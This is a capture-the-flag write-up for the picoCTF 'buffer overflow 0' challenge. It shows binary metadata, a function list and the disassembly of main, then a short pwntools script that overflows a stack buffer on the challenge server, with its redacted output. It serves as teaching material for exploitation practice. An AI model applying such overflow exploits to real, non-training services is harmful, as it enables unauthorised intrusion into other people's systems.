# buffer overflow 0

#### Information Given

Smash the stack

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using:

nc saturn.picoctf.net 65443

## Step 1

Analyze the binary Information

```
arch     x86                                                                                                                                                                                   
baddr    0x0                                                                                                                                                                                   
binsz    14775                                                                                                                                                                                 
bintype  elf                                                                                                                                                                                   
bits     32                                                                                                                                                                                    
canary   false                                                                                                                                                                                 
injprot  false                                                                                                                                                                                 
class    ELF32                                                                                                                                                                                 
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0                                                                                                                                            
crypto   false                                                                                                                                                                                 
endian   little                                                                                                                                                                                
havecode true                                                                                                                                                                                  
intrp    /lib/ld-linux.so.2                                                                                                                                                                    
laddr    0x0                                                                                                                                                                                   
lang     c                                                                                                                                                                                     
linenum  true                                                                                                                                                                                  
lsyms    true                                                                                                                                                                                  
machine  Intel 80386                                                                                                                                                                           
nx       true                                                                                                                                                                                  
os       linux                                                                                                                                                                                 
pic      true                                                                                                                                                                                  
relocs   true                                                                                                                                                                                  
relro    full                                                                                                                                                                                  
rpath    NONE                                                                                                                                                                                  
sanitize false                                                                                                                                                                                 
static   false                                                                                                                                                                                 
stripped false                                                                                                                                                                                 
subsys   linux                                                                                                                                                                                 
va       true
```

## Step 2

Without a 'flag.txt' file in your current working directory, the program will tell you to make one

```sh
ghostkey :: pocs/picoctf/buffer_overflow_0 ‹master*› » echo "picoCTF{testflag}" > flag.txt
```

Dry run

```sh
ghostkey :: pocs/picoctf/buffer_overflow_0 ‹master*› » ./vuln 
Input: stuff
The program will exit now
```

## Step 3

Dump all funcs

```
0x00001000  _init
0x00001100  __cxa_finalize@plt
0x00001110  printf@plt
0x00001120  fflush@plt
0x00001130  gets@plt
0x00001140  fgets@plt
0x00001150  signal@plt
0x00001160  getegid@plt
0x00001170  strcpy@plt
0x00001180  puts@plt
0x00001190  exit@plt
0x000011a0  __libc_start_main@plt
0x000011b0  fopen@plt
0x000011c0  setresgid@plt
0x000011d0  _start
0x00001210  __x86.get_pc_thunk.bx
0x00001220  deregister_tm_clones
0x00001260  register_tm_clones
0x000012b0  __do_global_dtors_aux
0x00001300  frame_dummy
0x00001309  __x86.get_pc_thunk.dx
0x0000130d  sigsegv_handler
0x00001353  vuln
0x00001382  main
0x0000149b  __x86.get_pc_thunk.ax
0x000014a0  __libc_csu_init
0x00001510  __libc_csu_fini
0x00001515  __x86.get_pc_thunk.bp
0x0000151c  _fini
```

We have a main function and vuln function

## Step 4

Disassemble the main function

```
0x00001382 <+0>:     endbr32
0x00001386 <+4>:     lea    0x4(%esp),%ecx
0x0000138a <+8>:     and    $0xfffffff0,%esp
0x0000138d <+11>:    push   -0x4(%ecx)
0x00001390 <+14>:    push   %ebp
0x00001391 <+15>:    mov    %esp,%ebp
0x00001393 <+17>:    push   %ebx
0x00001394 <+18>:    push   %ecx
0x00001395 <+19>:    sub    $0x70,%esp
0x00001398 <+22>:    call   0x1210 <__x86.get_pc_thunk.bx>
0x0000139d <+27>:    add    $0x2c0f,%ebx
0x000013a3 <+33>:    sub    $0x8,%esp
0x000013a6 <+36>:    lea    -0x1fa4(%ebx),%eax
0x000013ac <+42>:    push   %eax
0x000013ad <+43>:    lea    -0x1fa2(%ebx),%eax
0x000013b3 <+49>:    push   %eax
0x000013b4 <+50>:    call   0x11b0 <fopen@plt>
0x000013b9 <+55>:    add    $0x10,%esp
0x000013bc <+58>:    mov    %eax,-0xc(%ebp)
0x000013bf <+61>:    cmpl   $0x0,-0xc(%ebp)
0x000013c3 <+65>:    jne    0x13ef <main+109>
0x000013c5 <+67>:    sub    $0x4,%esp
0x000013c8 <+70>:    lea    -0x1f99(%ebx),%eax
0x000013ce <+76>:    push   %eax
0x000013cf <+77>:    lea    -0x1f84(%ebx),%eax
0x000013d5 <+83>:    push   %eax
0x000013d6 <+84>:    lea    -0x1f4f(%ebx),%eax
0x000013dc <+90>:    push   %eax
0x000013dd <+91>:    call   0x1110 <printf@plt>
0x000013e2 <+96>:    add    $0x10,%esp
0x000013e5 <+99>:    sub    $0xc,%esp
0x000013e8 <+102>:   push   $0x0
0x000013ea <+104>:   call   0x1190 <exit@plt>
0x000013ef <+109>:   sub    $0x4,%esp
0x000013f2 <+112>:   push   -0xc(%ebp)
0x000013f5 <+115>:   push   $0x40
0x000013f7 <+117>:   lea    0x94(%ebx),%eax
0x000013fd <+123>:   push   %eax
0x000013fe <+124>:   call   0x1140 <fgets@plt>
0x00001403 <+129>:   add    $0x10,%esp
0x00001406 <+132>:   sub    $0x8,%esp
0x00001409 <+135>:   lea    -0x2c9f(%ebx),%eax
0x0000140f <+141>:   push   %eax
0x00001410 <+142>:   push   $0xb
0x00001412 <+144>:   call   0x1150 <signal@plt>
0x00001417 <+149>:   add    $0x10,%esp
0x0000141a <+152>:   call   0x1160 <getegid@plt>
0x0000141f <+157>:   mov    %eax,-0x10(%ebp)
0x00001422 <+160>:   sub    $0x4,%esp
0x00001425 <+163>:   push   -0x10(%ebp)
0x00001428 <+166>:   push   -0x10(%ebp)
0x0000142b <+169>:   push   -0x10(%ebp)
0x0000142e <+172>:   call   0x11c0 <setresgid@plt>
0x00001433 <+177>:   add    $0x10,%esp
0x00001436 <+180>:   sub    $0xc,%esp
0x00001439 <+183>:   lea    -0x1f49(%ebx),%eax
0x0000143f <+189>:   push   %eax
0x00001440 <+190>:   call   0x1110 <printf@plt>
0x00001445 <+195>:   add    $0x10,%esp
0x00001448 <+198>:   mov    0x48(%ebx),%eax
0x0000144e <+204>:   mov    (%eax),%eax
0x00001450 <+206>:   sub    $0xc,%esp
0x00001453 <+209>:   push   %eax
0x00001454 <+210>:   call   0x1120 <fflush@plt>
0x00001459 <+215>:   add    $0x10,%esp
0x0000145c <+218>:   sub    $0xc,%esp
0x0000145f <+221>:   lea    -0x74(%ebp),%eax
0x00001462 <+224>:   push   %eax
0x00001463 <+225>:   call   0x1130 <gets@plt>
0x00001468 <+230>:   add    $0x10,%esp
0x0000146b <+233>:   sub    $0xc,%esp
0x0000146e <+236>:   lea    -0x74(%ebp),%eax
0x00001471 <+239>:   push   %eax
0x00001472 <+240>:   call   0x1353 <vuln>
0x00001477 <+245>:   add    $0x10,%esp
0x0000147a <+248>:   sub    $0xc,%esp
0x0000147d <+251>:   lea    -0x1f41(%ebx),%eax
0x00001483 <+257>:   push   %eax
0x00001484 <+258>:   call   0x1180 <puts@plt>
0x00001489 <+263>:   add    $0x10,%esp
0x0000148c <+266>:   mov    $0x0,%eax
0x00001491 <+271>:   lea    -0x8(%ebp),%esp
0x00001494 <+274>:   pop    %ecx
0x00001495 <+275>:   pop    %ebx
0x00001496 <+276>:   pop    %ebp
0x00001497 <+277>:   lea    -0x4(%ecx),%esp
0x0000149a <+280>:   ret
```

We see that there is a call to gets for the -0x70(%esp)and after that there's a call to the vuln function

## Exploit

```python
import pwn

payload = b'A' * 0x70

p = pwn.remote("saturn.picoctf.net", 65443)
p.recv()
p.sendline(payload)
flag = p.recvline()
pwn.log.success("CTF FLAG: %s" % flag.decode('utf-8'))
p.interactive()
```

- Send 0x70 bytes into the buffer to overflow for vuln function

```sh
(.venv) ghostkey :: pocs/picoctf/buffer_overflow_0 ‹master*› » python exploit.py 
[+] Opening connection to saturn.picoctf.net on port 65443: Done
[+] CTF FLAG: picoCTF{REDACTED}
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
```
